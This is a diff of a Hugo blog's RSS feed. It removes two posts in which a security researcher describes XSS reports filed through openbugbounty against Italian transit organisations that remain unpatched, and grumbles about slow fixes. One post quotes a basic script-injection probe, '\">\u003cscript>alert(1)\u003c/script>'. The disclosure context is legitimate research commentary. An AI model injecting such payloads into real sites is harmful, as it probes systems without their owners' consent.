-<p>Apparently what a researcher thinks is going to happen and what actually happens not always matches. Actually, almost never does in my experience.</p>
-<p>I used <a href="https://www.openbugbounty.org">openbugbounty</a> because, in all honestly, I  have no desire in time juggling myself through finding security contacts, emailing and explaining things, so if I can just break things, and have the rest happen auto-magically, so be it&hellip; or to put it differently, I&rsquo;m a lazy bum and I just don&rsquo;t give a flying fu*k (hell, it&rsquo;s my blog, why do I censure myself, fuck, I meant <strong>FUCK</strong> - sorry kids).</p>
-<p>Well long story short: those vulnerabilities are still unpatched to this day and I am kind of bored, so&hellip; blogpost.</p>
-<p>If anyone from <a href="https://twitter.com/InfoAtac">@InfoAtac</a>, <a href="https://twitter.com/BusCotral">@BusCotral</a> or <a href="https://twitter.com/romamobilita">@romamobilita</a> happens to read this blog post, maybe, just maybe, fix them? I&rsquo;m sure your users would appreciate it.
-Also, consider using a <a href="https://securitytxt.org/">security.txt</a>, or making it easier to find security contacts.</p>
-<p>By the way, public disclosures are a free as in beer service, however, rewards are still appreciated :).</p>
-<p>Until next time,
-pop alerts.</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>First commit</title>
-            <link>/posts/2021/03/first-commit/</link>
-            <pubDate>Wed, 10 Mar 2021 02:18:22 +0100</pubDate>
-            
-            <guid>/posts/2021/03/first-commit/</guid>
-            <description>For the few souls that ever followed my blog: I finally migrated. There was no real reason to keep a wordpress blog, as I really never used any features from Wordpress.
+    </item>
+    
+    <item>
+      <title>First commit</title>
+      <link>/posts/2021/03/first-commit/</link>
+      <pubDate>Wed, 10 Mar 2021 02:18:22 +0100</pubDate>
+      
+      <guid>/posts/2021/03/first-commit/</guid>
+      <description>For the few souls that ever followed my blog: I finally migrated. There was no real reason to keep a wordpress blog, as I really never used any features from Wordpress.
 I migrated to Github pages, because&amp;hellip; free hosting, and custom domains. Seemed nice enough to me, also for some reason I ended up using Hugo, over Jekyll. I could never get Jekyll to run even thought the setup is actually almsot the same as Hugo&amp;rsquo;s.</description>
-            <content type="html"><![CDATA[<p>For the few souls that ever followed my blog: I finally migrated.
-There was no real reason to keep a <a href="https://thatsn0tmysite.wordpress.com">wordpress blog</a>, as I really never used any features from Wordpress.</p>
-<p>I migrated to Github pages, because&hellip; free hosting, and custom domains. Seemed nice enough to me, also for some reason I ended up using Hugo, over Jekyll. I could never get Jekyll to run even thought the setup is actually almsot the same as Hugo&rsquo;s.</p>
-<p>Truth is, deep inside my brain there is a gopher lurking.</p>
-<p>Well, this was only a first post, I do not really have anything else to share. As always I end up writing once or less a year.</p>
-<p>Hopefully having migrated to github pages will push me to write more.</p>
-<p>Before fading to radio silence again, I will leave you with a question that has been hunting me lately.
-Do people really read reports from <a href="https://openbugbounty.org/">openbugbounty</a>, I reported several XSS issues since December, and they haven&rsquo;t been fixed yet, nothing exciting, just the usual suspect: <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>.</p>
-<p>In a few days the reports are going to be disclosed&hellip;</p>
-<p>Until then, cheers!</p>
-]]></content>
-        </item>
-        
-    </channel>
+    </item>
+    
+  </channel>
 </rss>
